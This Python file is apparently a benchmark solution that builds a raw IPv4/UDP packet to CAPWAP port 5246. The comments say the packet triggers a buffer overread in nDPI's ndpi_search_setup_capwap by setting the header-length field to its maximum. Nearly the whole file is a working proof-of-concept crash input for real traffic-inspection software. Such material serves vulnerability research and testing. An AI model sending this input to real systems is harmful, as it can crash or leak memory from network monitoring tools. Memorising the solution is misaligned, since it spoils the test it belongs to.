import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # IPv4 Header Construction
        # Version 4, IHL 5
        ip_ver_ihl = b'\x45'
        # TOS
        ip_tos = b'\x00'
        # Total Length: 20 (IP) + 8 (UDP) + 5 (Payload) = 33 bytes
        ip_total_len = struct.pack('!H', 33)
        # ID
        ip_id = b'\x00\x01'
        # Flags / Fragment Offset
        ip_frag_off = b'\x00\x00'
        # TTL
        ip_ttl = b'\x40'
        # Protocol: UDP (17)
        ip_proto = b'\x11'
        # Source and Destination IP (127.0.0.1)
        ip_src = b'\x7f\x00\x00\x01'
        ip_dst = b'\x7f\x00\x00\x01'
        
        # Calculate IP Checksum
        # Create a temporary header with checksum set to 0
        tmp_header = ip_ver_ihl + ip_tos + ip_total_len + ip_id + ip_frag_off + ip_ttl + ip_proto + b'\x00\x00' + ip_src + ip_dst
        
        s = 0
        for i in range(0, len(tmp_header), 2):
            w = (tmp_header[i] << 8) + tmp_header[i+1]
            s += w
            
        # Fold 32-bit sum to 16 bits
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        ip_chk = ~s & 0xffff
        
        # Assemble IP Header
        ip_header = ip_ver_ihl + ip_tos + ip_total_len + ip_id + ip_frag_off + ip_ttl + ip_proto + struct.pack('!H', ip_chk) + ip_src + ip_dst
        
        # UDP Header Construction
        # Port 5246 is CAPWAP Control
        udp_src = struct.pack('!H', 5246)
        udp_dst = struct.pack('!H', 5246)
        # Length: 8 header + 5 payload = 13
        udp_len = struct.pack('!H', 13)
        udp_chk = b'\x00\x00'
        
        udp_header = udp_src + udp_dst + udp_len + udp_chk
        
        # Payload Construction
        # The vulnerability in ndpi_search_setup_capwap is a buffer overread caused by trusting
        # the HLEN field in the CAPWAP header without sufficient bounds checking.
        # HLEN is located in the second byte of the CAPWAP header (bits 0-4 of byte 1).
        # We set byte 1 to 0xFF to maximize HLEN (31), resulting in a calculated offset (31*4 = 124)
        # that exceeds the payload length (5 bytes).
        payload = b'\x00\xff\x00\x00\x00'
        
        return ip_header + udp_header + payload